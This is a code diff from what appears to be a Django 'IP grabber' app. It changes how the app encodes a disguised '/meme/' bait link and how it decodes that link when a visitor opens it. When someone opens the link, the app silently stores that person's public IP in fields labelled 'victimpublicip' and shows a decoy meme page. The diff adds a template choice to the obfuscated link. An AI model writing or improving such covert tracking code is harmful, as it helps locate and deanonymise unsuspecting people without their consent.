@@ -430,9 +430,13 @@ def settings(request):
     return render(request, 'settings.html')
 
 def meme(request, username):
-
+  secret=str(str(request.META['PATH_INFO']).split('/')[-1]).replace('a','=')
+  secret=base64.b64decode(secret)
+  secret=secret.decode('ascii')
+  secret="".join(["0123456789abcdefghijklmnopqrstuvwxyz"[("0123456789abcdefghijklmnopqrstuvwxyz".find(c)+23)%36] for c in secret])
+  
   if request.method == 'GET':
-    return render(request, 'meme.html')
+    return render(request, 'meme'+secret[-1]+'.html')
 
   elif request.method == 'POST':
     username = username
@@ -447,12 +451,7 @@ def meme(request, username):
         publicip = str(x_forwarded_for.split(',')[0])
     else:
         publicip = str(request.META.get('REMOTE_ADDR'))
-
-    secret=str(str(request.META['PATH_INFO']).split('/')[-1]).replace('a','=')
-    secret=base64.b64decode(secret)
-    secret=secret.decode('ascii')
-    secret="".join(["abcdefghijklmnopqrstuvwxyz"[("abcdefghijklmnopqrstuvwxyz".find(c)+13)%26] for c in secret])
-    user = User.objects.filter(username=secret).first()
+    user = User.objects.filter(username=secret[:-1]).first()
 
     if user.profile.victimpublicip == '' : # Assigning values for the first time
       user.profile.victimpublicip = publicip
@@ -472,7 +471,7 @@ def meme(request, username):
         pass
 
     user.profile.save()
-    return render(request, 'meme.html')
+    return render(request, 'meme'+secret[-1]+'.html')
 
 def tracker(request):
 
@@ -497,13 +496,11 @@ def tracker(request):
         pass
     except:
       pass
-      
-    secret="".join(["abcdefghijklmnopqrstuvwxyz"[("abcdefghijklmnopqrstuvwxyz".find(c)+13)%26] for c in str(username)])
+    secret="".join(["0123456789abcdefghijklmnopqrstuvwxyz"[("0123456789abcdefghijklmnopqrstuvwxyz".find(c)+13)%36] for c in str(username+request.POST['template'])])
     secret=base64.b64encode(str(secret).encode('ascii'))
     if "=" in str(secret.decode('ascii')):
           secret=str(secret.decode('ascii')).replace('=','a')
     url = "http://"+str(request.META['HTTP_HOST'])+'/meme/' + str(secret)
-
     # Fetching values from DB as list
     
     victimpublicip = user.profile.victimpublicip
@@ -523,9 +520,7 @@ def tracker(request):
 
     if victimpublicip != ['']:
       return render(request, 'tracker.html', {'victim':victim,'url':url})
-
     else:
-
       return render(request, 'tracker.html', {'url':url})
 
 def logout(request):
